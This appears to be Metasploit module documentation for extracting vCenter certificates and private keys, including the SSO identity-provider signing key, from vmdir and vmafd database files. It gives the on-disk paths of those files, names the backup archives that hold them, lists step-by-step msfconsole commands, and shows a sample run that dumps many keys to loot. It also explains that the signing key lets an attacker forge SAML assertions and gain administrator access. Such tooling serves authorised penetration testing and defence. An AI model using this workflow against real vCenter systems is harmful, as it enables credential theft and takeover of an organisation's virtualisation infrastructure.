Grab certificates from the vCenter server vmdird or vmafd database files and adds them to loot.
This module will accept files from a live vCenter appliance or from a vCenter appliance backup
archive; either or both files can be supplied to the module depending on the situation. The module
will extract the vCenter SSO IdP signing credential from the vmdir database, which can be used to
create forged SAML assertions and access the SSO directory as an administrator. The vmafd service
contains the vCenter certificate store which from which the module will attempt to extract all vmafd
certificates that also have a corresponding private key. Portions of this module are based on
information published by Zach Hanley at Horizon3:

https://www.horizon3.ai/compromising-vcenter-via-saml-certificates/

## Vulnerable Application
This module is tested against the vCenter appliance but will probably work against Windows instances.
It has been tested against files from vCenter appliance versions 6.5, 6.7, and 7.0. The module will
work with files retrieved from a live vCenter system as well as files extracted from an unencrypted
vCenter backup archive.

## Verification Steps
You must possess the vmdir and/or vmafd database files from vCenter in order to use this module. The
files must be local to the system invoking the module. Where possible, you should provide the
`VC_IP` option to tag relevant loot entries with the IPv4 address of the originating system. If no
value is provided for `VC_IP` the module defaults to assigning the loopback IP `127.0.0.1`.

1. Acquire the vmdir and/or vmafd database files from vCenter (see below)
2. Start msfconsole
3. Do: `use auxiliary/admin/vmware/vcenter_offline_mdb_extract`
4. Do: `set vmdir_mdb <path to data.mdb>` if you are extracting from the vmdir database
5. Do: `set vmafd_db <path to afd.db>` if you are extracting from the vmafd database
6. Do: `set vc_ip <vCenter IPv4>` to attach the target vCenter IPv4 address to loot entries
7. Do: `dump`

## Options
**VMDIR_MDB**

Path to the vmdird MDB database file on the local system. Example: `/tmp/data.mdb`

**VMAFD_DB**

Path to the vmafd DB file on the local system. Example: `/tmp/afd.db`

**VC_IP**

Optional parameter to set the IPv4 address associated with loot entries made by the module.

## Scenarios

### Acquire Database Files
This module targets the internal databases of vCenter vmdir (OpenLDAP Memory-Mapped Database) and
vmafd (SQLite3). On a live vCenter appliance, these files can be downloaded with root access from
the following locations:

`vmdir: /storage/db/vmware-vmdir/data.mdb`
`vmafd: /storage/db/vmware-vmafd/afd.db`
    
If you are extracting from a backup file, target files are available in the following archives:

`vmdir: lotus_backup.tar.gz`
`vmafd: config_files.tar.gz`

### Running the Module
Example run against database files extracted from vCenter appliance version 7.0 Update 3d:

```
msf6 > use auxiliary/admin/vmware/vcenter_offline_mdb_extract
msf6 auxiliary(admin/vmware/vcenter_offline_mdb_extract) > set vmdir_mdb /tmp/data.mdb
vmdir_mdb => /tmp/data.mdb
msf6 auxiliary(admin/vmware/vcenter_offline_mdb_extract) > set vmafd_db /tmp/afd.db
vmafd_db => /tmp/afd.db
msf6 auxiliary(admin/vmware/vcenter_offline_mdb_extract) > set vc_ip 192.168.100.70
vc_ip => 192.168.100.70
msf6 auxiliary(admin/vmware/vcenter_offline_mdb_extract) > dump

[*] Extracting vmwSTSTenantCredential from /tmp/data.mdb ...
[+] SSO_STS_IDP key: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_idp_571080.key
[+] SSO_STS_IDP cert: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_idp_564729.pem
[+] VMCA_ROOT cert: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_vmca_721819.pem
[*] Extracting vSphere platform certificates from /tmp/afd.db ...
[+] __MACHINE_CERT key: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70___MACHINE_CERT_869237.key
[+] __MACHINE_CERT cert: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70___MACHINE_CERT_240839.pem
[+] DATA-ENCIPHERMENT key: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_DATAENCIPHERMEN_350586.key
[+] DATA-ENCIPHERMENT cert: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_DATAENCIPHERMEN_106169.pem
[+] HVC key: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_HVC_825963.key
[+] HVC cert: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_HVC_399928.pem
[+] MACHINE key: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_MACHINE_995574.key
[+] MACHINE cert: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_MACHINE_156797.pem
[+] SMS_SELF_SIGNED key: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_SMS_SELF_SIGNED_169524.key
[+] SMS_SELF_SIGNED cert: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_SMS_SELF_SIGNED_230704.pem
[+] VPXD key: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_VPXD_370336.key
[+] VPXD cert: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_VPXD_300599.pem
[+] VPXD-EXTENSION key: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_VPXDEXTENSION_571196.key
[+] VPXD-EXTENSION cert: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_VPXDEXTENSION_088742.pem
[+] VSPHERE-WEBCLIENT key: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_VSPHEREWEBCLIEN_060718.key
[+] VSPHERE-WEBCLIENT cert: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_VSPHEREWEBCLIEN_280013.pem
[+] WCP key: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_WCP_057402.key
[+] WCP cert: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_WCP_909204.pem
[*] Auxiliary module execution completed
msf6 auxiliary(admin/vmware/vcenter_offline_mdb_extract) > 
```